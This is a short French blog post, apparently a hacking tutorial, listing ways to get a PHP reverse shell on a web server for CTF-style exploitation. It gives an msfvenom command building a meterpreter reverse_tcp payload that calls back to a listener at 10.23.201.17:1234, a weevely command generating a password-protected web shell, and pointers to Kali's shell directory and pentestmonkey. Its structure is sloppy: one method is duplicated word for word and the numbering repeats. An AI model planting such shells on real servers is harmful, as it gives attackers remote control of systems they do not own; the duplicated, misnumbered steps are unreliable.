---
layout: post
section-type: post
title: Reverse shell
category: exploitation web
tags: [ 'reverse_shell', 'web', 'hacking', 'ctf' ]
---

---------------------------------------------
#### Mise en garde
Le but de cet article est de vous montrer les différentes manières façons de vous munir d'un "reverse shell".

Pour des raisons de modularité, un article traitant le reverse shell de façon complète sera rédigé et il fera réference à celui-ci ainsi qu'à plein d'autres disponibles sur mon site. 

---------------------------------------------

#### Pré requis 
1-Avoir les bases d'un langage de programmation côté serveur <br/>
2-Avoir installer et configurer une machhine orientée "sécurité" (Kali linux, Parrot OS,...) <br/>
3-Avoir fait les configurations nécessaires dans le routeur pour le cas où la connexion à la machine est distante

---------------------------------------------

#### Méthode 1: shell par défaut sur kali linux
  <pre><code data-trim class="yaml">
      #répertoire par défaut des "reverse shell" sur Kali linux
      cd /usr/share/webshell/php 
  </code></pre> <br/>

NB: Il ne faudra pas oublier de faire les modifications qui vont bien dans ce fichier notamment votre IP et port d'écoute.
---------------------------------------------

#### Méthode 2: créer un reverse shell avec meterpreter
  <pre><code data-trim class="yaml">
      #reverse shell nommé enregistré sur le bureau sous "come-on.php" au profit de la machine d'IP 10.23.201.17 écoutant sur le port 1234
      msfvenom -p php/meterpreter/reverse_tcp LHOST=10.23.201.17 LPORT=1234 > /Desktop/come-on.php
  </code></pre> <br/>

---------------------------------------------

#### Méthode 3: créer un reverse shell avec weevely
  <pre><code data-trim class="yaml">
      #reverse shell nommé enregistré sur le bureau sous "come-on.php" avec le mot de passe "noLog_hhhhhhhh"
      weevely generate noLog_hhhhhhhh /root/Desktop/come-on.php 
  </code></pre> <br/>

NB: Il ne faudra pas oublier de faire les modifications qui vont bien dans ce fichier notamment votre IP et port d'écoute.
---------------------------------------------

#### Méthode 4: créer un reverse shell avec weevely
  <pre><code data-trim class="yaml">
      #reverse shell nommé enregistré sur le bureau sous "come-on.php" avec le mot de passe "noLog_hhhhhhhh"
      weevely generate noLog_hhhhhhhh /root/Desktop/come-on.php 
  </code></pre> <br/>

NB: Il ne faudra pas oublier de faire les modifications qui vont bien dans ce fichier notamment votre IP et port d'écoute.
---------------------------------------------

#### Méthode 3: utiliser Internet
  visiter le site web : [http://pentestmonkey.net/](http://pentestmonkey.net/), par exemple

NB: Il ne faudra pas oublier de faire les modifications qui vont bien dans le fichier téléchargé notamment votre IP et port d'écoute.
---------------------------------------------
